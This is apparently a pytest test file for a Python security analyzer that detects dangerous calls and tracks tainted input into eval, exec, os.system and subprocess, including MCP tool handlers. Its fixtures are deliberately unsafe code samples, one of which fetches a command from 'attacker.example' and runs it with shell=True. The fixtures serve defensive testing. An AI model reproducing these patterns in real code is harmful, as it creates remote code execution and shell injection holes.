import os, sys, textwrap

sys.path.insert(0, os.path.join(os.path.dirname(__file__), "..", "server"))
from python_analyzer import analyze_python


def _write(tmp_path, name, body):
    p = tmp_path / name
    p.write_text(textwrap.dedent(body))
    return str(p)


def _categories(findings):
    return {(f["category"], f["detected_by"]) for f in findings}


def _descriptions(findings):
    return [f["description"] for f in findings]


# --- AST risk detection ---

def test_eval_call_flagged(tmp_path):
    p = _write(tmp_path, "a.py", "eval('1+1')\n")
    r = analyze_python(p)
    assert any(f["detected_by"] == "AST" and "eval" in f["description"].lower()
               for f in r["findings"])


def test_exec_call_flagged(tmp_path):
    p = _write(tmp_path, "a.py", "exec('print(1)')\n")
    r = analyze_python(p)
    assert any("exec" in f["description"].lower() for f in r["findings"])


def test_pickle_loads_flagged(tmp_path):
    p = _write(tmp_path, "a.py", """
        import pickle
        pickle.loads(b'')
    """)
    r = analyze_python(p)
    assert any("pickle" in f["description"].lower() for f in r["findings"])


def test_yaml_load_flagged(tmp_path):
    p = _write(tmp_path, "a.py", """
        import yaml
        yaml.load('foo')
    """)
    r = analyze_python(p)
    assert any("yaml" in f["description"].lower() for f in r["findings"])


def test_os_system_flagged(tmp_path):
    p = _write(tmp_path, "a.py", "import os\nos.system('ls')\n")
    r = analyze_python(p)
    assert any("os.system" in f["description"] for f in r["findings"])


def test_subprocess_shell_true_flagged(tmp_path):
    p = _write(tmp_path, "a.py", """
        import subprocess
        subprocess.run('echo hi', shell=True)
    """)
    r = analyze_python(p)
    assert any("shell=True" in f["description"] for f in r["findings"])


def test_subprocess_shell_false_not_flagged(tmp_path):
    p = _write(tmp_path, "a.py", """
        import subprocess
        subprocess.run(['echo', 'hi'])
    """)
    r = analyze_python(p)
    assert not any("shell=True" in f["description"] for f in r["findings"])


def test_dynamic_getattr_flagged(tmp_path):
    p = _write(tmp_path, "a.py", "getattr(obj, 'ev' + 'al')(x)\n")
    r = analyze_python(p)
    assert any("Dynamic attribute access" in f["description"] for f in r["findings"])


def test_dynamic_import_flagged(tmp_path):
    p = _write(tmp_path, "a.py", "__import__('os').system('ls')\n")
    r = analyze_python(p)
    assert any("__import__" in f["description"] for f in r["findings"])


# --- Taint tracking ---

def test_taint_envvar_to_eval(tmp_path):
    p = _write(tmp_path, "a.py", """
        import os
        def go():
            x = os.environ['CMD']
            eval(x)
    """)
    r = analyze_python(p)
    assert any(f["detected_by"] == "TAINT" and "eval" in f["description"]
               for f in r["findings"])


def test_taint_input_to_exec(tmp_path):
    p = _write(tmp_path, "a.py", """
        def go():
            cmd = input('? ')
            exec(cmd)
    """)
    r = analyze_python(p)
    assert any(f["detected_by"] == "TAINT" and "exec" in f["description"]
               for f in r["findings"])


def test_taint_sys_argv_to_os_system(tmp_path):
    p = _write(tmp_path, "a.py", """
        import os, sys
        def go():
            cmd = sys.argv[1]
            os.system(cmd)
    """)
    r = analyze_python(p)
    assert any(f["detected_by"] == "TAINT" and "shell injection" in f["description"]
               for f in r["findings"])


def test_taint_requests_to_subprocess(tmp_path):
    p = _write(tmp_path, "a.py", """
        import requests, subprocess
        def go():
            resp = requests.get('https://attacker.example/cmd').text
            subprocess.run(resp, shell=True)
    """)
    r = analyze_python(p)
    assert any(f["detected_by"] == "TAINT" and "subprocess.run" in f["description"]
               for f in r["findings"])


def test_taint_fstring_propagates(tmp_path):
    p = _write(tmp_path, "a.py", """
        import os
        def go():
            x = os.environ['Y']
            cmd = f"echo {x}"
            os.system(cmd)
    """)
    r = analyze_python(p)
    assert any(f["detected_by"] == "TAINT" for f in r["findings"])


def test_taint_concat_propagates(tmp_path):
    p = _write(tmp_path, "a.py", """
        import os
        def go():
            x = os.environ['Y']
            cmd = 'echo ' + x
            os.system(cmd)
    """)
    r = analyze_python(p)
    assert any(f["detected_by"] == "TAINT" for f in r["findings"])


def test_taint_mcp_handler_args_marked(tmp_path):
    p = _write(tmp_path, "a.py", """
        from mcp.server import Server
        server = Server('x')

        @server.call_tool()
        async def handle(name, arguments):
            cmd = arguments['cmd']
            eval(cmd)
    """)
    r = analyze_python(p)
    assert any(f["detected_by"] == "TAINT" and "eval" in f["description"]
               for f in r["findings"])


def test_non_mcp_function_params_not_tainted(tmp_path):
    # Plain function — param is not auto-tainted, so this should NOT raise a TAINT finding
    p = _write(tmp_path, "a.py", """
        def helper(x):
            eval(x)
    """)
    r = analyze_python(p)
    taint = [f for f in r["findings"] if f["detected_by"] == "TAINT"]
    assert taint == []


def test_constant_arg_to_eval_no_taint_finding(tmp_path):
    p = _write(tmp_path, "a.py", "eval('1+1')\n")
    r = analyze_python(p)
    taint = [f for f in r["findings"] if f["detected_by"] == "TAINT"]
    assert taint == []
    # The AST risk visitor still flags the eval call itself
    assert any(f["detected_by"] == "AST" for f in r["findings"])


# --- Robustness ---

def test_safe_code_clean(tmp_path):
    p = _write(tmp_path, "a.py", """
        def add(a, b):
            return a + b
    """)
    r = analyze_python(p)
    assert r["findings"] == []
    assert r["files_analyzed"] == 1


def test_syntax_error_skipped(tmp_path):
    p = _write(tmp_path, "a.py", "def broken(:\n")
    r = analyze_python(p)
    assert r["findings"] == []
    assert any("syntax error" in s["reason"] for s in r["skipped"])


def test_non_python_file_reports_skipped(tmp_path):
    p = tmp_path / "data.txt"
    p.write_text("not python")
    r = analyze_python(str(p))
    assert r["findings"] == []
    assert any("not a .py" in s["reason"] for s in r["skipped"])


def test_missing_path_returns_error(tmp_path):
    r = analyze_python(str(tmp_path / "does_not_exist"))
    assert "error" in r


def test_directory_walks_all_py(tmp_path):
    (tmp_path / "a.py").write_text("eval('x')\n")
    sub = tmp_path / "pkg"
    sub.mkdir()
    (sub / "b.py").write_text("exec('y')\n")
    (sub / "ignored.txt").write_text("nope")
    r = analyze_python(str(tmp_path))
    assert r["files_analyzed"] == 2
    assert len(r["findings"]) >= 2


def test_directory_skips_venv_and_pycache(tmp_path):
    pycache = tmp_path / "__pycache__"
    pycache.mkdir()
    (pycache / "a.py").write_text("eval('x')\n")
    venv = tmp_path / ".venv"
    venv.mkdir()
    (venv / "b.py").write_text("exec('y')\n")
    (tmp_path / "real.py").write_text("def x(): return 1\n")
    r = analyze_python(str(tmp_path))
    assert r["files_analyzed"] == 1
    assert r["findings"] == []


def test_oversized_file_skipped(tmp_path, monkeypatch):
    monkeypatch.setattr("python_analyzer._FILE_SIZE_LIMIT", 50)
    p = tmp_path / "big.py"
    p.write_text("def x():\n    return 1\n" * 200)
    r = analyze_python(str(p))
    assert r["files_analyzed"] == 0
    assert any("exceeds" in s["reason"] for s in r["skipped"])
